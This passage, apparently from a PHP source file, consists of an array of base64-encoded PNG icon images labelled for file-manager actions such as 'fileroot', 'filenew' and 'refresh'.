            "zsx4nhd+n4DAAiAvvPD89QeAIAyGvrx79+yhA4cKJ987aWZmj/1lrVZ/cWFx6dDs8ZMvT940XfjD".
            "Bx7AY498Ha1WC1prUErR7rRx8r1fIx6PIxpxkYzH0NPbA2sthBQI/ACDg3mUSqUrZ86ePsQ5XyUA".
            "eHWr+vH21loAZG9+YLB7c3MTQobGdSOPjgwXn8rlBkYOHTzi9mWzSCYS6LQ70FpDKQlYwOUcd95x".
            "GG+89QusXy2hdHUdRik9OjZiKMHG1NTeXjfiuv39ucz8QmwvAVYJIeDcdT9VgFJqrdVqyWgsjv5s".
            "P++7++jReq2OcqWCer2OSrWC9z9Yx7H/Po7H//QRRF0X66Uy/MDHcKGA/lwWF+fncf7/LiAIAuJJ".
            "hb6eTGzPpOWJeBxBEKp2s7XO+bb8eKft/Vbbmblff/D+6w997aEnEokELnz4Ef7t31+Vs7PHpeM4".
            "8aHhAqrVTdx++DCiEReLS8t47l+eB2UcI4VB3H3XH+Cv/uLPcfSuO3Hi1Cl7eWXV2b9/f6ZYLGJ4".
            "uIhXX335zee+/89ntDawAPiz33v2UwVQxsgfP/y1Tk9PDw4eOIiv3nILhvKD7K2pG8mxmRPI53MY".
            "L47g4Yf+CGEQ4u23f45qaQ0EBKW1Kzg7N4fJiQk89idfx/333M0c10WxWATnDt54803MzJ4I2x0v".
            "DsDbVt1n0f+tbz81mxscHK1USjhw623YNz2NWCyOdqeDSqWMZqMOYy2MsThz5gykDAEQuJEI4vEU".
            "isVhDBUKiEajoJTi4ocX8cpr/4mlpSvo6U7Ov/Gz1+/VWq8DkL89BwgBmFKyuau3BxubGzg2cxyz".
            "J09gqFDAaHEU+Xwe+fweaKVACMW+ffs+bmFKKJRWKJdLKJdLWFxcxNLlJfhBgEgkgrGxEdTq9dGB".
            "wtBfr60sP2utbXymAACbx4/P/OQrN988Pb13CqfPzuHtX7yL1eWVE+1mrZofHLztpump7EixSJLJ".
            "FKIRF0opdDwPUggYC7Q7LcSiMQghEI1GwRnDQK4XjuMiCLK8P5d96p133mWX5z/6JvucI3DK5cpF".
            "32+P7NkzNTG1ZxJDQ3kY2ETb873VtfXy5ZXVTLVSiZ06eQpn5+Zw5cqqbTabpF5voFbbQuAHsNaC".
            "gCDVlUQ0GkVvbw8cx4HDHXRnutC7K3vzpUsL/8Eo+0wNxhgjFhYW352fn29yxsYmJyfSR44cjh05".
            "cnjo1ltvKe7bPx27444jGMjnsVlr2FBIQ5lDCXdACANlHBYE3OGw1sIaA6UURChAGUMqmUIskeQL".
            "l1eWSXF8HL7vw3EcNGp1tBp1YNs8OQCeSMRvLI6OPrj/K9N3T9x442RheKg3leoidGeea2MghIQI".
            "BYIwQKvZwsLSgrl0aaHTaLSWHcd1+vp2DfX2dsczXSlEoxH057JYuLyG1996+2kyesMNEEJisDAE".
            "qSSa9TrazSa2qlVYa6C1vqaNXsflIwMDA1OJRHwk25fNJ1OpjOu6CQBESOG1m636xsbGeijCK+VS".
            "5Vyr1S4B8N1oLJHp7hkZGBzYl0ylHi/kB79aKldRq9f+jl+bgFJKKK2QTHUlE8k0697VB0II2s2m".
            "7XTaxBorASyurpYWjJa4gA8jACLXOaoBIAAoME7T6Z5Iby7BYZGLxRPprnR6gHGe0cak67UtJGMR".
            "1BognBACbcw4pfTPerq6j6QSid2c8wRjlBBKwRgDY8xSSkEIsVIISCmgtYE2GkYbGKNhjIExFgAI".
            "ZQycO5RSUEqok+7q4rt6e1mn08La6ioC3weJxABLkjyVTv/Nl8bHnxnO9/dpKUEIAWMMlFI4joNI".
            "NALOOSihYIzCmG13C4MQUgpIpSGlQBiGEEKCALAAjJawygCMweUEEYehLgS0Vkin0/BCCQu0eSKZ".
            "vGly91jf1bV1SCWQTKbguA5isSgch4NRjkg0Ctd1tnnWBpxTEAJQRuEYjTAg0ErBSTjb9isE3HgU".
            "jPHtdJSIoy/XB6U1otEItNG4tLgMa+0Ct9YKrTW60l3o6emGMQacO0inUyCEQgiBTCYD7jgIgwCM".
            "MVhr0Gy2IKWE4zrwPR90kyHVlYK1FlubW8hk0nBcF41GA/FYDMlkEm7ERccDyqUyfM9XlNIlSsi2".
            "HTgOh+M4sHZblNfeX5/f7PUP16Woa99ef28tYIwB7HbE67Q7kFJi5fIyNja24IfifaP1RU4JAaUU".
            "CvZTCxhjPjYHrQ0IUQB2ukVJhKFAGAbwfR+e58P3fYRBAG0MgiCA73k7M0IgHouBgiIIQkhjIA3q".
            "pbX1b1TLVyW/9lfWWNRqNXQ6Hqy1qFarcDiD47iobdXBGAWhBEpqCBEiCENIISCVghAhwkBAiBB2".
            "x1KM0SAgIJTCWOBquYpmq+1t1Fq/hNb/CC3f01p/kopbrTaazSZi0RjcSGTnKABtJYTSH7udVBKh".
            "EAhDASGkkVIaKaVVSmulrTbGamtNaC0aWpsNpc0aaXpLV9bKF0RA3nVcLDp8h1oAXBsDawGlFJQG".
            "KpuNS4EIz2hl6hbwrYFHYHxLSUBgfW2MZ7RtW2s6xhCfEOvBEh8UHizxqCEe4UaAUGmtlRZQLmeg".
            "hIAzDkL0TqPuxHKtta1UN1Cq1j7a2qw9TUB+Sh3uWWNhCQBNwIiB5RSMbldNCQEI3dHMznpkmzFq".
            "t3VkCcHvAx744cj5C/MXjLX3cdgVytg2PWTHAa4Jc+e6vZ/F/xd4NBJ5LRGPnoG1K1ubNXzR4AN9".
            "u16LRSOBVgq1rdpOkPjiQD5vuHyR+M0AX/RfJxMEm0UAAAAASUVORK5CYII=",
            "fileroot" =>
            "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAK".
            "T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AU".
            "kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXX".
            "Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgAB".
            "eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAt".
            "AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3".
            "AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dX".
            "Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+".
            "5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk".
            "5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd".
            "0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA".
            "4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzA".
            "BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/ph".
            "CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5".
            "h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+".
            "Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhM".
            "WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQ".
            "AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+Io".
            "UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdp".
            "r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZ".
            "D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61Mb".
            "U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY".
            "/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllir".
            "SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79u".
            "p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6Vh".
            "lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1".
            "mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lO".
            "k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7Ry".
            "FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3I".
            "veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+B".
            "Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/".
            "0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5p".
            "DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5q".
            "PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIs".
            "OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5".
            "hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ".
            "rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9".
            "rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d".
            "T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX".
            "Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7".
            "vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S".
            "PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa".
            "RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO".
            "32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21".
            "e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV".
            "P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i".
            "/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8".
            "IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADq".
            "YAAAOpgAABdvkl/FRgAABklJREFUeNrsl0tvJFcZhp/vnFNV3V3tbnvsdvvSQ2ZCHEiECGAuWYDw".
            "TPgBWWSDxIbs+QmIDNJsWRDBiv8QhLhICCksWHAZUBLGSImYizLjjK/tcV+quqr6nMOiutv2OCxY".
            "oNlMSVUlVVed7z3v+36XFu89T/NQPOXjGYBnAAzAjRs3zj30HnQgr8/Va9eV0gb4H1PF4wEBcc6N".
            "h8P03VFavOOcPffWzZs3SwAmOE+Ec+6FTmft7c+9+GLHexApQeFBKUEQUHI2XhnUT0L7EoBS5bq3".
            "t2+/UY3q/9rY2PjwUxkwJjize08QyHdf+eIrHRC01oAnTRPCMERpjdEKpXQJbPINbhoclFYopeh2".
            "jwnDCptf+erq3fv3vmdC/UNELgIIg3D2wForjWb9ehzH7HyyQz2uMxj0CYKAIAwoioKi8DOpnqAB".
            "78EYTSWqMEwSjh+f8PJLL9H9+63X3n/vgx8Zrd30i80vbZYAZuuIMHb2crvd/hoCCwtNbGE5Ojri".
            "6tWraG1Q6pTiJ43jOSOXKD7T6eC8R2tNZ339y3u7e8+HYfjvC1lQFClFkZLnQ7wrrrfbK7Edjxn0".
            "h9y5e49mc55KtYpWGq01Whu01iilZqc2BmMMavKbtWOK8RgRwTnL2tp6JQz1FoxBbHlOJZh4Bec8".
            "tbi2tbi4SLd7yHCYsLGxQVyPsdaCTP0NURgRTKTL85xRlpbmlJJSj8d5z2g0QmlNq9Uijuvf7vV6".
            "v1BnDKwAhBAhxFpdX1ldvxYEBqU0z125QqPRQLygVbkzrTTNxjz1eoPxeMx4PKbRaLJ0aRmtVPmO".
            "0RhtCCas9Ps9jDGsrXW20qSYyzNHnrlTBqwvSgZ8sbmysnoZhJX2KlmRlSiNLjc2cd14PKbf75Pn".
            "2YRiT7VaQRszyQyZOTQIAg6PDjk8PKDVaq1HFbMZGP3HaTaU5DuLs2MqUfSd1ZVVGQwH1OKYMAjQ".
            "SmGULtPPGLQ2OOeIopA4rhPHdbRWZFk284DRpVeCIMA5x3H3mCRNWG63pVqNXvNYBHcKwHmNtaJa".
            "y+1rlSgiy0YkyZBmc4EgmOT+xIBG6wm1AWEYEgSlNFNwZmLCMAzxHj786CPqc3WiKKJei1laWt5y".
            "TiskOJUgjmMGw8Hz62vrm3mREwYBSZqglWa+OU9RFGR5VhrxQup7Llydp98fsrv7iPn5eZaWFrHW".
            "4vGsr3c2Hzx4+JxIcG8G4M3vv8lf/vrna61Wq5KmKXleUKvVGSYDknRItRoThSFRVMF7jx2Py7Lx".
            "RJMQgSwv6Cc9RqOUpaUlTGBw1jIcDknShFarVTWB2rI2vzeT4Gc/f5u79+5cW2mvEFUilNLs7++h".
            "lCZNU/YPdtl5tMP+/h7DQR/nHVobgjAkjCqEYYg2GusceZ6htVCtVmCi89Fxl/2DfXonJ9TrMY25".
            "ua1qNTr1wFtv/TheWlr+lgk0e3u7JGnKaJTSPe4SRRVqtZhapYooxSjL6fd7HB93OTw64uBgj739".
            "Pfb39+kedUmSIVmakRc5HmE4GNDrndDv9/nk0S7GBKytdb7569/8rjqTYJRmjdvb281Xv/F1Xvjs".
            "BuCx1pVFRFSZMZO0EZl0w7Jr4jw4P22+HoVCjEJPm402vPz5L8w6o1aKD/55e/EPv3+3DqSmXFQ1".
            "f/mr38r9+x+zeGmhFBdBpFRZRFCiUErwk8DTQytFo9nAaIOI4L3He48IyAS8c44kScjznJNej7/d".
            "ek8j0gAOJqVYoiwr1K1/vI8oUKJApGz5ImiliMIIYzRja2cm9N6xeGmRxcUFOp0OR4dHIB5nPd47".
            "VtfW2N7e5nKnQzoacffuHYwxWOuUiEQzCTyMtFajaq1a894jU6qlvAdBQBSetmwlU3bAeUcQhPT7".
            "fRCw1k0qYMjJ48eTNM5JhgMqlQpaa8bW7uIZzAA453YOD/Z/2mq3f6C1njfG6OncIKJQIljvcdae".
            "qwUiQp7lPNzZQSbBnbMopQiC4Fy6FtaRppnN8nzv4YOPf+K92wWQUi9RwILS+spco/nq8ura6967".
            "KYQnKs/5iUbOjSNcqA9yevF7n+y80++d/Mk7dx/oe+/9FMD0tRpQF5HKxVnnvwc8H+1TRliZjUsJ".
            "MACysrd5zgKYGfv/NK77SWVyZ+dPefbn9GkD+M8AvO3VteGZeoAAAAAASUVORK5CYII=",
            "filenew" =>
            "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAK".
            "T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AU".
            "kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXX".
            "Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgAB".
            "eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAt".
            "AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3".
            "AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dX".
            "Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+".
            "5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk".
            "5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd".
            "0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA".
            "4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzA".
            "BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/ph".
            "CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5".
            "h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+".
            "Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhM".
            "WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQ".
            "AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+Io".
            "UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdp".
            "r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZ".
            "D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61Mb".
            "U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY".
            "/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllir".
            "SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79u".
            "p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6Vh".
            "lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1".
            "mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lO".
            "k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7Ry".
            "FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3I".
            "veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+B".
            "Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/".
            "0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5p".
            "DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5q".
            "PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIs".
            "OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5".
            "hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ".
            "rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9".
            "rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d".
            "T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX".
            "Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7".
            "vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S".
            "PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa".
            "RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO".
            "32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21".
            "e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV".
            "P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i".
            "/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8".
            "IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADq".
            "YAAAOpgAABdvkl/FRgAABCRJREFUeNrEl8FuG1UUhr9zZjxjJ05TKXXSVE1aEBKURQCJrvoQlAVC".
            "7Nh0VyQkeAXeoGwq1DdgwQZVAokWpEhhAYsIaEmrFqdtmqSNnRDHnszMPSwSp+54xnYrpI40Gs31".
            "zP2/+99zzhyLmfEqDz87cO3aNYAxEXlu3MyOTgDnXN9YkohVKs3SxYtXE5XQfJ9pESnHsaa+v/9v".
            "GDa34qQSj48/QMQB1g8QhuFX8/Pzn3ieZ2ZmXZBeoaxw9yqi1mg8Onbz5seP335r+frc3N2/RaKx".
            "MCgZBNtxNL1q2vkDdBM034HTp09fOn/+fK3VaiEidAFEBDOj15nnXRJUI3Z3Y1ZXg2nnzi5sbe3e".
            "OXnq4l4aX99w7s4D0fAfCGut3dd+GZ+YeSx5AJ7nJe12m0ajgar2QeRdQRBxqD5AdYWZWp3Jybuo".
            "vv5GEHxOIlP7UfvLNSS9DUEZK3cs2fpBfDp9AF3bVRXP846EisVBRIE2vreO5z2hVPWpjC0QBJcO".
            "bC59FJhtnEmSxaq5x6nZ9tOo07xVqbKiWYDBQlJ4qrRR3SAMjzNVu0JYvoLoO4dvlikFX1AZ+3Yq".
            "CD97F4lmk3TyJHQjYQBE141B4iKCaIIqxPGvtPe+AfrT26XL7EdXIqCCSDUXwDkHcCSaF3D5ED6I".
            "jzmPqHMVl/6enZko+hqzegwlJyKd3CzoLUzZvc/WhmfjilDFbALfq6E6DXiZJxXnOoC3CbqlurMx".
            "ECBv9cVXA6uCncSYAd4EJkiS70jjn1DvLH7pQ6JoPvVV73m+rARhcD8XYFjU5//Ggf2cwdk2YrDX".
            "uorZMsg27P+Gn/zFzo65ycnyMhb/7HmTrUKAI9N64mB4PTDgGLCAWZnU3QEmwDqAYDbFzk4zrtWS".
            "78erK/cLvwWjBF0R0AHEcczew5gHtoA2Zh6BzvLk6e14fePPexcuPMLzEsLwJYMwD+bZO4ZZCTgF".
            "zALusFKOkySrLC6+7926tYCIcfnygBjIluE8qOJ7OxQGs4N7kRQRR6m0T7tdAYShaTgo7/OceOZG".
            "L7Rl7kHVFfcDvWlYJFy08v4vJAN7iqFZMChFu0KqWgiVzaiROqJRhAe50e0bhrkxcAsGiY1SsPLa".
            "uaJ5/KKP0YtuxbAtGNmBFxUtKlQvDVDUpvc2p6NsyShz5vYDgx4uEh+tOMloAMMg/u9DXzQG8uCy".
            "Y9li81Ix0DtJr7Cq5m5F73u98TIMKC8Ng0qlMrQZHaVd7xU+rIRBNh76AOr1+vUbN258oKo453DO".
            "iZnpIZAcTigFW2Q9CzERcSJi3YXU6/Uffd/fG+hAq9X6dGlpaSqKIllfX9eHDx96zWbT39zc9BqN".
            "hmdm3VMzIE5VUxFJfd9P5+bm0hMnTiSzs7PJzMyMq9Vqdu7cuadra2vpcxnyqv+e/zcAgQcBimrG".
            "kQkAAAAASUVORK5CYII=",
            "refresh" =>
            "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAK".
            "T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AU".
            "kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXX".
            "Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgAB".
            "eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAt".
            "AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3".
            "AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dX".
            "Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+".
            "5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk".
            "5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd".
            "0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA".
            "4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzA".
            "BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/ph".
            "CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5".
            "h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+".
